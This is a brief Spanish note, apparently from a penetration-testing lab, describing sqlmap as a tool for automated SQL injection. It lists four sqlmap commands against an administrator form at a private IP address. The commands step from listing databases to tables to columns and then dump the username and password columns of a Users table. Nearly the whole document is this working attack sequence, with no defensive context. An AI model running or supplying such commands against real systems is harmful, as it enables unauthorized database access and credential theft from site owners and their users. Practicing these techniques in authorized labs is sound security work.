
Esta es una herramienta para realizar inyecciones sql autmatizadas 
```shell
sqlmap -u http://10.0.2.17/administrator/ --forms --dbs --batch
sqlmap -u http://10.0.2.17/administrator/ --forms -D Webapp --tables --batch
sqlmap -u http://10.0.2.17/administrator/ --forms -D Webapp -T Users --columns --batch
sqlmap -u http://10.0.2.17/administrator/ --forms -D Webapp -T Users -C username,password --dump --batch
```